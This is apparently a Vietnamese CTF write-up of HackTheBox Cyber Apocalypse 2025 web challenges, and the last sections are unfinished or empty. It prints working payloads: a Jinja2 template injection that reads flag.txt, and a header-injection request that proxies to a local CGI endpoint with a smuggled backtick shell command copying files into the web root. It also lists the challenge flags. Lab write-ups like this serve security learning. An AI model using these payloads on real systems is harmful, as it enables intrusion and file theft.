---
title: "Cyber Apocalypse CTF 2025: Tales from Eldoria"
date: 2025-06-28
draft: false
description: "for funnn"
tags: ["web"]
---

# Cyber Apocalypse CTF 2025: Tales from Eldoria

# Mục Lục

**Cyber Apocalypse CTF 2025: Tales from Eldoria**

![image](https://hackmd.io/_uploads/rJvMf4fa1e.png)

- [Whispers of the Moonbeam -> CMDI](#HTB-1)
- [Trial by Fire -> SSTI](#HTB-2)
- [Cyber Attack -> SSRF](#HTB-3)
- [Eldoria Panel](#HTB-4)
- [Eldoria Realms](#HTB-5)
- [Aurors Archive](#HTB-6)

## HTB 1

![image](https://hackmd.io/_uploads/ryOiFq-TJg.png)
Thử thêm `;` vào
![image](https://hackmd.io/_uploads/HynJ55WaJg.png)
**FLAG** : `HTB{Sh4d0w_3x3cut10n_1n_Th3_M00nb34m_T4v3rn_b3872c798c16be5a94c8b3498ca76f9e}`

## HTB 2

![image](https://hackmd.io/_uploads/Hkw8c9-pyx.png)
Hãy check thử 1 vài payload đơn giản
![image](https://hackmd.io/_uploads/S1u-sc-6Jl.png)
Tuy nhiên lưu ý rằng phần mà nó render là trang này
![image](https://hackmd.io/_uploads/ByuFQibaJe.png)
![image](https://hackmd.io/_uploads/Hk-INjWTJx.png)
![image](https://hackmd.io/_uploads/H1rzVibakl.png)
giờ xem nó render thế nào thì phải qua api `@web.route('/battle-report', methods=['POST'])`
![image](https://hackmd.io/_uploads/BJrOSoZp1e.png)

```python==
damage_dealt={{ request.__class__._load_form_data.__globals__.__builtins__.open("flag.txt").read() }}
```

[Document](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html)

**FLAG**:`HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_d703a81708e499d0a9c8864989b22d2d}`

## HTB 3

mất khá nhiềy thời gian thì mình chỉ có 1 hướng đó là XSS đến
Đây là đoạn code bị lỗi chăng
![image](https://hackmd.io/_uploads/BJMiWfo3yx.png)
![image](https://hackmd.io/_uploads/SkkCWfj2ye.png)
Nó chỉ cho loopback ip
![image](https://hackmd.io/_uploads/S1CQ7Mjhyg.png)
Tuy nhiên để bypass qua reg của nó thì khá khó
Nên mình nghĩ đến hàm tương tự đó là attack ip
![image](https://hackmd.io/_uploads/ByNgFZp2Jg.png)
Tuy nhiên lại setting ip để nó có thể enable nút này
![image](https://hackmd.io/_uploads/HJKtFb6nkg.png)
Làm thế nào để set ip đây
![image](https://hackmd.io/_uploads/rklYPbp3kx.png)
:::success
Sau tất cả thì mình nghĩ là sẽ thay đổi ip của mình để trigger được phần attack ip sau đó command injection
:::
:::danger

- Vẫn ý tưởng cũ là fake local nhưng sau đó copy flag ra ngoài
- Như ở trên ta có hai con đường để tương tác với os đó là attack domain và attack ip tuy nhiên attack domain bị filter khá chặt và chắc chắn sẽ rơi vào dòng này

![image](https://hackmd.io/_uploads/Sykdj_GpJg.png)
Vậy muốn đi tiếp thì chỉ có cách lợi dụng biến `$name` .

- Còn attack ip thì đã bị disable . Ít nhất phải check ip local mới enable được
- Vậy ta sẽ lợi dụng biến **$name** này như 1 **browser** để **render** 1 gói tín **request** khác

![image](https://hackmd.io/_uploads/r1e0adM6yg.png)
[From orange](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/#%E2%9C%94%EF%B8%8F-2-1-2-Disclose-PHP-Source-Code)
bắt trước theo và gắn vào `name`
Như vậy đã có thể gửi request đến với local
Làm thế nào để tương tác với os  
![image](https://hackmd.io/_uploads/B191GFf6kx.png)
Đi sâu vào hàm `ip_address`
![image](https://hackmd.io/_uploads/SJJrzFfpkg.png)
![image](https://hackmd.io/_uploads/S1fpzFz6Jx.png)
Như vậy ý tướng sẽ là `1::%` + `payload`
![image](https://hackmd.io/_uploads/SJqvYYMTyl.png)
ý tưởng sẽ copy nó ra ngoài thư mục root
đây là payload
LƯU Ý:

- dùng ` để lấy ra kết quả của shell trên **URL**

```python==
http://
Location:/ooo
Content-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip?target=::1%`cd+..;cd+..;cd+..;cp+flag*+$(printf+"/var/www/html/flagHTB.txt")`&name=meo

HTTP/1.1
```

đây là giá trị của biến `$name`
thử encode url để xem
![image](https://hackmd.io/_uploads/rJhLItz6kx.png)
Không được . Có thể do các kí tự bên trong như `;` ; `/` thử thay nó bằng Mã ASCII
`;` -> `3B`
`/` -> `2F`
PAYLOAD cuối cùng

```python=
http://
Location:/ooo
Content-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip?target=::1%`cd+..3Bcd+..3Bcd+..3Bcp+flag*+$(printf+"2Fvar2Fwww2Fhtml2FflagHTB.txt")`&name=meo

HTTP/1.1

```

sau dó url encode nó lại
![image](https://hackmd.io/_uploads/ryXzKKzpkx.png)
![image](https://hackmd.io/_uploads/BkSotFzpyg.png)
**FLAG:**`HTB{h4ndl1n6_m4l4k4r5_f0rc35}`
:::

## HTB 4

![image](https://hackmd.io/_uploads/BJzzzI6hkl.png)
![image](https://hackmd.io/_uploads/r1CJEIpnJl.png)
![image](https://hackmd.io/_uploads/HyJ4NUpn1l.png)
Tuy nhiên nó đã bị filter bới `escapeshellarg()`
Không khả thi
`companions` thì có vẻ không có gì
![image](https://hackmd.io/_uploads/SJUAwUT3yg.png)
Nếu mà là SQLi thì update được user và passwd của admin chăng
càng hợp lí hơn khi mà trong sr có trang của admin
tuy nhiên
![image](https://hackmd.io/_uploads/BJgytK63yl.png)
![image](https://hackmd.io/_uploads/ryDAjt631l.png)
Dựa vào SQLi để fake những thông tin trên sao ????
Mục đích giờ là đi vào admin

## HTB 5

## HTB 6

##
